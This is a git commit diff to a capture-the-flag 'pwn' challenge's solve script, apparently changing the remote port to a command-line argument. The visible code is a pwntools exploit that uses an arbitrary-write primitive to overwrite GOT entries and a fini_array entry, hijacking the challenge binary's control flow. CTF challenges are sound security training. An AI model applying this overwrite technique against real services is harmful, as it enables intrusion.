bc98d4537da7bd19f0b76e0b712096d6f3addb29
jnovikov <johnnovikov0@gmail.com>
2023-10-25 15:19:24 +0100

    Spy pwn deploy yeey

--- tasks/pwn/spy/solve/sploit.py
+++ tasks/pwn/spy/solve/sploit.py
@@ -13,7 +13,7 @@ def write(r: tube, what: int, where: int):
     r.sendlineafter(b"Enter destination of the message:", hex(where).encode())
 
 
-with remote(sys.argv[1], 13000) as r:
+with remote(sys.argv[1], sys.argv[2]) as r:
     write(r, binary.symbols[b'main'], binary.got[b'puts'])
     write(r, binary.symbols[b'spy_open'], binary.symbols[b'__do_global_dtors_aux_fini_array_entry'])
     write(r, binary.symbols[b'spy_print'], binary.got[b'strchrnul'])
